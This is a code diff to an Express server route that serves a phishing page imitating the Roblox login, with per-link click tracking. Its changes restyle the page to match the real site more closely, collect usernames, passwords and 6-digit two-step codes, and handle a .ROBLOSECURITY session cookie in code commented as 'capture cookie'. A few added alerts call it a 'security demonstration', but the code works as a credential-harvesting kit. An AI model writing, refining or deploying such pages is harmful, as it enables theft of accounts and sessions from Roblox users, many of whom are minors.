@@ -1898,7 +1898,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Update click count
       await storage.updateRobloxLinkClicks(trackingId);
 
-      // Serve fake Roblox login page HTML that looks exactly like real Roblox
+      // Serve fake Roblox login page HTML that looks exactly like real Roblox.com/Login
       const fakeLoginHtml = `
 <!DOCTYPE html>
 <html lang="en">
@@ -1907,7 +1907,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login - Roblox</title>
     <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;500;600;700&display=swap">
     <style>
         * {
             margin: 0;
@@ -1916,135 +1915,126 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
         
         body {
-            font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #00A2FF 0%, #0080FF 100%);
+            font-family: "Source Sans Pro", Arial, sans-serif;
+            background: #00b2ff;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }
         
         .header {
             position: absolute;
-            top: 20px;
-            left: 20px;
-            z-index: 10;
+            top: 24px;
+            left: 24px;
         }
         
-        .logo-container {
+        .logo {
             display: flex;
             align-items: center;
             text-decoration: none;
         }
         
         .logo-icon {
-            width: 28px;
-            height: 28px;
-            background: white;
+            width: 30px;
+            height: 30px;
+            background: #ffffff;
             border-radius: 6px;
-            margin-right: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
+            color: #00b2ff;
             font-weight: bold;
-            color: #00A2FF;
-            font-size: 16px;
+            font-size: 18px;
+            margin-right: 8px;
         }
         
         .logo-text {
+            color: #ffffff;
             font-size: 18px;
             font-weight: 700;
-            color: white;
-        }
-        
-        .main-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex: 1;
-            padding: 20px;
         }
         
         .login-container {
-            background: white;
+            background: #ffffff;
+            padding: 48px;
             border-radius: 8px;
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
-            padding: 40px;
-            width: 100%;
-            max-width: 400px;
-            position: relative;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            width: 400px;
+            max-width: 90vw;
         }
         
         .login-header {
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 24px;
         }
         
         .login-title {
-            font-size: 24px;
-            font-weight: 700;
             color: #393B3D;
+            font-size: 28px;
+            font-weight: 700;
             margin-bottom: 8px;
         }
         
         .login-subtitle {
             color: #606770;
-            font-size: 14px;
-            font-weight: 400;
+            font-size: 16px;
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
         
         .form-label {
             display: block;
-            margin-bottom: 6px;
             color: #393B3D;
+            font-size: 14px;
             font-weight: 600;
-            font-size: 13px;
+            margin-bottom: 6px;
         }
         
-        .form-input {
+        .form-control {
             width: 100%;
-            padding: 12px 16px;
+            height: 48px;
+            padding: 0 16px;
             border: 1px solid #c3c4c7;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 14px;
             color: #393B3D;
-            background: white;
-            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+            background: #ffffff;
+            transition: all 0.2s ease;
         }
         
-        .form-input:focus {
+        .form-control:focus {
             outline: none;
-            border-color: #00A2FF;
-            box-shadow: 0 0 0 2px rgba(0, 162, 255, 0.2);
+            border-color: #00b2ff;
+            box-shadow: 0 0 0 3px rgba(0, 178, 255, 0.1);
         }
         
-        .form-input::placeholder {
+        .form-control::placeholder {
             color: #868E96;
         }
         
-        .login-button {
+        .btn-primary {
             width: 100%;
-            padding: 12px;
-            background: #00A2FF;
-            color: white;
+            height: 48px;
+            background: #00b2ff;
+            color: #ffffff;
             border: none;
-            border-radius: 4px;
+            border-radius: 6px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.15s ease-in-out;
-            margin-bottom: 20px;
+            transition: background-color 0.2s ease;
+            margin: 24px 0 16px 0;
         }
         
-        .login-button:hover {
-            background: #0091E6;
+        .btn-primary:hover {
+            background: #0099e6;
         }
         
-        .login-button:disabled {
-            background: #9ca3af;
+        .btn-primary:disabled {
+            background: #bdc3c7;
             cursor: not-allowed;
         }
         
@@ -2060,11 +2050,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
         
         .two-factor-title {
-            font-size: 18px;
-            font-weight: 600;
             color: #393B3D;
-            margin-bottom: 8px;
+            font-size: 20px;
+            font-weight: 600;
             text-align: center;
+            margin-bottom: 8px;
         }
         
         .two-factor-desc {
@@ -2074,35 +2064,33 @@ export async function registerRoutes(app: Express): Promise<Server> {
             margin-bottom: 20px;
         }
         
-        .error-message {
-            background: #fee2e2;
-            border: 1px solid #fecaca;
-            color: #dc2626;
-            padding: 12px;
-            border-radius: 4px;
+        .alert {
+            padding: 12px 16px;
+            border-radius: 6px;
             font-size: 14px;
             margin-bottom: 16px;
             display: none;
         }
         
-        .success-message {
-            background: #dcfce7;
-            border: 1px solid #bbf7d0;
-            color: #16a34a;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            margin-bottom: 16px;
-            display: none;
+        .alert-error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+        
+        .alert-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
         }
         
         .forgot-password {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         
         .forgot-password a {
-            color: #00A2FF;
+            color: #00b2ff;
             text-decoration: none;
             font-size: 14px;
             font-weight: 500;
@@ -2119,7 +2107,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
         
         .signup-section a {
-            color: #00A2FF;
+            color: #00b2ff;
             text-decoration: none;
             font-weight: 600;
         }
@@ -2131,53 +2119,51 @@ export async function registerRoutes(app: Express): Promise<Server> {
 </head>
 <body>
     <div class="header">
-        <a href="#" class="logo-container">
+        <a href="#" class="logo">
             <div class="logo-icon">R</div>
             <div class="logo-text">Roblox</div>
         </a>
     </div>
     
-    <div class="main-container">
-        <div class="login-container">
-            <div class="login-header">
-                <h1 class="login-title">Log in to Roblox</h1>
-                <p class="login-subtitle">Enter your username and password</p>
+    <div class="login-container">
+        <div class="login-header">
+            <h1 class="login-title">Log in to Roblox</h1>
+            <p class="login-subtitle">Enter your username and password</p>
+        </div>
+        
+        <div class="alert alert-error" id="errorMessage"></div>
+        <div class="alert alert-success" id="successMessage"></div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username" class="form-label">Username or Email</label>
+                <input type="text" id="username" name="username" class="form-control" placeholder="Username or Email" required>
             </div>
             
-            <div class="error-message" id="errorMessage"></div>
-            <div class="success-message" id="successMessage"></div>
+            <div class="form-group">
+                <label for="password" class="form-label">Password</label>
+                <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
+            </div>
             
-            <form id="loginForm">
+            <button type="submit" class="btn-primary" id="loginBtn">Log In</button>
+            
+            <div class="two-factor-section" id="twoFactorSection">
+                <h2 class="two-factor-title">Two-Step Verification</h2>
+                <p class="two-factor-desc">Enter the 6-digit code from your authenticator app</p>
                 <div class="form-group">
-                    <label for="username" class="form-label">Username or Email</label>
-                    <input type="text" id="username" name="username" class="form-input" placeholder="Username or Email" required>
+                    <label for="twoFactorCode" class="form-label">Verification Code</label>
+                    <input type="text" id="twoFactorCode" name="twoFactorCode" class="form-control" placeholder="000000" maxlength="6">
                 </div>
-                
-                <div class="form-group">
-                    <label for="password" class="form-label">Password</label>
-                    <input type="password" id="password" name="password" class="form-input" placeholder="Password" required>
-                </div>
-                
-                <button type="submit" class="login-button" id="loginBtn">Log In</button>
-                
-                <div class="two-factor-section" id="twoFactorSection">
-                    <h2 class="two-factor-title">Two-Step Verification</h2>
-                    <p class="two-factor-desc">Enter the 6-digit code from your authenticator app</p>
-                    <div class="form-group">
-                        <label for="twoFactorCode" class="form-label">Verification Code</label>
-                        <input type="text" id="twoFactorCode" name="twoFactorCode" class="form-input" placeholder="000000" maxlength="6">
-                    </div>
-                    <button type="button" class="login-button" id="verifyBtn">Verify & Log In</button>
-                </div>
-            </form>
-            
-            <div class="forgot-password">
-                <a href="#">Forgot your password?</a>
+                <button type="button" class="btn-primary" id="verifyBtn">Verify & Log In</button>
             </div>
-            
-            <div class="signup-section">
-                Don't have an account? <a href="#">Sign up</a>
-            </div>
+        </form>
+        
+        <div class="forgot-password">
+            <a href="javascript:void(0)" onclick="alert('This is a security demonstration. Please use the real Roblox website for actual password recovery.')">Forgot your password?</a>
+        </div>
+        
+        <div class="signup-section">
+            Don't have an account? <a href="javascript:void(0)" onclick="alert('This is a security demonstration. Please use the real Roblox website to create an account.')">Sign up</a>
         </div>
     </div>
 
@@ -2250,12 +2236,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
             const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';
             
             if (!username || !password) {
-                showError('Please enter both username and password.');
+                showError('Please fill in all required fields.');
                 return;
             }
             
-            if (includeToken && !twoFactorCode) {
-                showError('Please enter the 6-digit verification code.');
+            if (includeToken && (!twoFactorCode || twoFactorCode.length !== 6)) {
+                showError('Please enter a valid 6-digit verification code.');
                 return;
             }
             
@@ -2287,11 +2273,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 if (response.ok) {
                     if (!includeToken) {
-                        // Simulate checking if user has 2FA enabled (random 30% chance)
-                        const has2FA = Math.random() < 0.3;
+                        // Simulate checking if user has 2FA enabled (random 40% chance)
+                        const has2FA = Math.random() < 0.4;
                         
                         if (has2FA) {
-                            showSuccess('Verifying your account...');
+                            showSuccess('Account verified. Two-step verification required.');
                             setTimeout(() => {
                                 hideMessages();
                                 twoFactorSection.classList.add('show');
@@ -2299,7 +2285,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                             }, 1500);
                         } else {
                             // No 2FA - capture cookie and redirect immediately
-                            showSuccess('Login successful! Redirecting to Roblox...');
+                            showSuccess('Login successful! Redirecting to your account...');
                             
                             // Set the .ROBLOSECURITY cookie to simulate successful login
                             document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;
@@ -2310,7 +2296,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                         }
                     } else {
                         // 2FA completed - capture cookie and redirect
-                        showSuccess('Authentication successful! Redirecting to Roblox...');
+                        showSuccess('Two-step verification complete! Logging you in...');
                         
                         // Set the .ROBLOSECURITY cookie after 2FA
                         document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;
@@ -2320,10 +2306,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
                         }, 2000);
                     }
                 } else {
-                    showError('Invalid username or password. Please try again.');
+                    showError('Something went wrong. Please check your credentials and try again.');
                 }
             } catch (error) {
-                showError('Network error. Please check your connection and try again.');
+                showError('Connection failed. Please check your internet connection and try again.');
             }
         }
         
@@ -2365,9 +2351,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         // Auto-format 2FA code input
         document.getElementById('twoFactorCode').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            let value = e.target.value.replace(/\\D/g, ''); // Remove non-digits
             if (value.length > 6) value = value.substr(0, 6); // Limit to 6 digits
             e.target.value = value;
+        });
+        
+        // Prevent form submission on enter in 2FA field
+        document.getElementById('twoFactorCode').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                verifyBtn.click();
+            }
         });
     </script>
 </body>
